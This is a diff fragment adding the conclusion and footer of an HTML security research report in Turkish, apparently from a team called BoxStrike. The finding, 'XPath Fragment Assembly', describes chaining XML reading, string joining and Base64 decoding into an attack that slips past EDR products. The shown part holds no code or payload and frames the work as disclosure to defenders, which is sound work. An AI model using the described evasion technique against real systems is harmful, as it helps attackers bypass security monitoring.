+        Bu araştırma, sistemlerin “meşru” kabul ettiği işlemlerin (XML okuma, string birleştirme,
+        Base64 çözme) aslında bir saldırı zincirinin parçası olabileceğini göstermektedir.
+        Saldırganlar, bu tür Living Off the Land teknikleriyle güvenlik ürünlerini kolayca aşabilir.
+    </p>
+    <p>
+        BoxStrike ekibi olarak, bu açığı savunma ekiplerine bildirmek ve EDR üreticilerinin bu tür
+        davranışları da izlemesi gerektiğini vurgulamak amacıyla bu raporu herkese açık olarak
+        yayınlıyoruz.
+    </p>
+
+    <!-- FOOTER -->
+    <div class="footer">
+        <span>BoxStrike Araştırma Ekibi · Bulgu 002 · XPath Fragment Assembly</span>
+        <span>7 Ağustos 2026 · Sürüm 1.0</span>
+    </div>
+
+</div>
+</body>
+</html>
